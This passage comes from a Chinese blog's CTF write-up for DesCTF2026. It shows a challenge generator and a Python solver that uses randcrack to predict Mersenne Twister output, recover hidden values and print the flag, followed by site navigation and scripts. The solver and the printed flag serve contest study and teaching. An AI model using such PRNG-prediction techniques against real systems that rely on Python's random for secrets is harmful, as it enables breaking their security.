class="string">f&#x27;签文：<span class="subst">&#123;sign&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">f&#x27;天命：<span class="subst">&#123;t&#125;</span>&#x27;</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pull</span>(<span class="params">k</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    off = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> off &lt; k:</span><br><span class="line">        x |= random.getrandbits(<span class="number">32</span>) &lt;&lt; off</span><br><span class="line">        off += <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; ((<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    names = [<span class="string">f&#x27;有缘人<span class="subst">&#123;i:04d&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count)]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;命书.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;天命阁旧录\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;知天命，可窥未来。\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;见未来，方知真形。\n\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">            f.write(make_book(name))</span><br><span class="line">            f.write(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">        bound = yin * yang</span><br><span class="line">        trace = yin ^ (yang &gt;&gt; kbits)</span><br><span class="line">        seal_a = bound ^ pull(bits * <span class="number">2</span>)</span><br><span class="line">        seal_b = trace ^ pull(bits)</span><br><span class="line">        f.write(<span class="string">&#x27;【未来残页】\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">f&#x27;阴阳交积封印：<span class="subst">&#123;seal_a&#125;</span>\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">f&#x27;阴阳离合封印：<span class="subst">&#123;seal_b&#125;</span>\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;flag = DesCTF&#123;md5(str(min(yin,yang)) + &quot;|&quot; + str(max(yin,yang)))&#125;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260309000602655.png" alt="image-20260309000602655" /></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> divisors</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getdata</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    t = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> re.findall(<span class="string">r&#x27;天命：(\d+)&#x27;</span>, content)]</span><br><span class="line">    a = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;阴阳交积封印：(\d+)&#x27;</span>, content).group(<span class="number">1</span>))</span><br><span class="line">    b = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;阴阳离合封印：(\d+)&#x27;</span>, content).group(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> t, a, b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pull</span>(<span class="params">k, rc</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    off = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> off &lt; k:</span><br><span class="line">        x |= rc.predict_getrandbits(<span class="number">32</span>) &lt;&lt; off</span><br><span class="line">        off += <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; ((<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t, a, b = getdata(<span class="string">&#x27;命书.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rc_inputs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2492</span>, <span class="number">4</span>):</span><br><span class="line">    val = t[i] | (t[i+<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (t[i+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (t[i+<span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    rc_inputs.append(val)</span><br><span class="line">    </span><br><span class="line">last_three_bytes = t[<span class="number">2492</span>:] <span class="comment"># t2492, t2493, t2494</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> miss <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    r623 = last_three_bytes[<span class="number">0</span>] | (last_three_bytes[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (last_three_bytes[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (miss &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        </span><br><span class="line">    rc = RandCrack()</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> rc_inputs:</span><br><span class="line">        rc.submit(v)</span><br><span class="line">    rc.submit(r623)</span><br><span class="line">        </span><br><span class="line">    p64 = pull(<span class="number">64</span>, rc)</span><br><span class="line">    p32 = pull(<span class="number">32</span>, rc)</span><br><span class="line">        </span><br><span class="line">    A = a ^ p64</span><br><span class="line">    B = b ^ p32</span><br><span class="line">    <span class="keyword">if</span> A == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> divisors(A):</span><br><span class="line">            yin = d</span><br><span class="line">            yang = A // d</span><br><span class="line">            <span class="keyword">if</span> (yin ^ (yang &gt;&gt; <span class="number">6</span>)) == B:</span><br><span class="line">                v1, v2 = <span class="built_in">min</span>(yin, yang), <span class="built_in">max</span>(yin, yang)</span><br><span class="line">                res = <span class="string">f&quot;<span class="subst">&#123;v1&#125;</span>|<span class="subst">&#123;v2&#125;</span>&quot;</span></span><br><span class="line">                flag = hashlib.md5(res.encode()).hexdigest()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;DesCTF&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line"><span class="comment"># DesCTF&#123;28dc9b687456ef5897c4477a98a8bdbf&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h2>
+<h3 id="wireshark工控流量分析-modbustcp"><a class="markdownIt-Anchor" href="#wireshark工控流量分析-modbustcp"></a> wireshark(工控流量分析-modbus/TCP)</h3>
+<p><img src="../images/640-177313388291415.webp" alt="图片" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="国赛刷题训练" class="lazyload">
+          
+        
+        <a href="/2026/03/10/%E5%9B%BD%E8%B5%9B%E5%88%B7%E9%A2%98%E8%AE%AD%E7%BB%83/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            国赛刷题训练
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="[Vulnhub靶机通关]PowerGrid" class="lazyload">
+        
+      
+      <a href="/2026/03/06/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DPowerGrid/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [Vulnhub靶机通关]PowerGrid
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#notehubjwt%E4%BC%AA%E9%80%A0undefsafe%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.1.</span> <span class="toc-text"> NoteHub(JWT伪造+undefsafe原型链污染)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-java"><span class="toc-number">1.2.</span> <span class="toc-text"> Baby Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#confrontation"><span class="toc-number">1.3.</span> <span class="toc-text"> Confrontation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#check-inrsa%E5%8F%98%E7%A7%8D"><span class="toc-number">2.1.</span> <span class="toc-text"> Check in(RSA变种)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%BF%91%E4%BC%BC"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 关键近似</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%82k"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 求k</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%BD%E4%BA%BA%E4%BA%8B%E5%90%AC%E5%A4%A9%E5%91%BDmt19937-random%E9%A2%84%E6%B5%8B"><span class="toc-number">2.2.</span> <span class="toc-text"> 尽人事，听天命(MT19937 random预测)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text"> MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wireshark%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-modbustcp"><span class="toc-number">3.1.</span> <span class="toc-text"> wireshark(工控流量分析-modbus&#x2F;TCP)</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "DesCTF2026",
+          url: "http://example.com/2026/03/08/DesCTF2026/",
+          excerpt: "",
+          description: "",
+          stripContent: " Web  NoteHub(JWT伪造+undefsafe原型链污染) 源码： 12345678910111213141516171819202122232425262728293031323334const undefsafe = require(&amp;#x27;undefsafe&amp;#x27;);const jwt = require(&amp;quot;jsonwebtoken&amp;quot;);const secretKey = &amp;quot;???&amp;quot;;class Notes &amp;#123;    ",
+          date: "Sun Mar 08 2026 14:53:49 GMT+0800",
+          updated: "Tue Mar 10 2026 17:11:28 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
